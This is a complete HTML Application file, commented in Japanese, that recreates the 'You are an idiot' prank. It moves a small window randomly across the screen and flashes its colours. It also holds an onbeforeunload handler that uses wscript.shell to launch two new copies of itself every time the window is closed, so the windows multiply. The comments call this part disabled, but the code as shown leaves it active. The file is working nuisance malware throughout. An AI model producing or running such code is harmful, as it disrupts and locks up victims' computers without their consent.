<html>
<head>
<meta charset="shift_jis">
<title>You are an idiot HTA</title>

<script type="text/javascript">

//ウィンドウの大きさを指定
var win_w = 300;
var win_h = 400;

//ウィンドウを指定サイズに変更
window.resizeTo(win_w,win_h);

//モニターの表示可能範囲を取得
var src_w = screen.availWidth;
var src_h = screen.availHeight;

//ウィンドウをランダムに動かす関数 moveRandom を定義
function moveRandom(){
    var rnd_x = Math.random()*(src_w - win_w);
    var rnd_y = Math.random()*(src_h - win_h);
    window.moveTo(rnd_x, rnd_y);
}

//400ミリ秒間隔で関数 moveRandom を実行
var moveID = setInterval("moveRandom()",400);

//------↓★オマケ★↓------

//色を決定するフラグ
var col_f = false;

//色を変える関数 changeColor を定義
function changeColor(){
    if(col_f){
        document.body.style.backgroundColor="black";
        document.getElementById("face").style.color="white";
    }else{
        document.body.style.backgroundColor=""
        document.getElementById("face").style.color="";
    }
    //色を決定するフラグを反転
    col_f = !col_f;
}

//800ミリ秒間隔で関数 changeColor を実行
var changeID = setInterval("changeColor()",800);

//------↑★オマケ★↑------

//---↓★さらにオマケ★↓---

//↓この「/*」を削除した上で...，
window.onbeforeunload = function(){
    var ws = new ActiveXObject("wscript.shell");
    ws.run(location.pathname);
    ws.run(location.pathname);
    ws = null;
};
//↑この「*/」を削除して起動すると...，
//ウィンドウを閉じるたびにウィンドウが増殖する(恐)

//---↑★さらにオマケ★↑---

</script>

<hta:application
    applicationname="hahahahahaha!"
    scroll="no"
>

</head>
<body>
<table width="100%" height="100%" border="0">
<tr><td valign="middle" align="center">
<div id="face">
<div style="font-size: 70pt;">&#9787; &#9787; &#9787;</div>
<div>you are an idiot</div>
</div>
</td></tr>
</table>
</body>
</html>
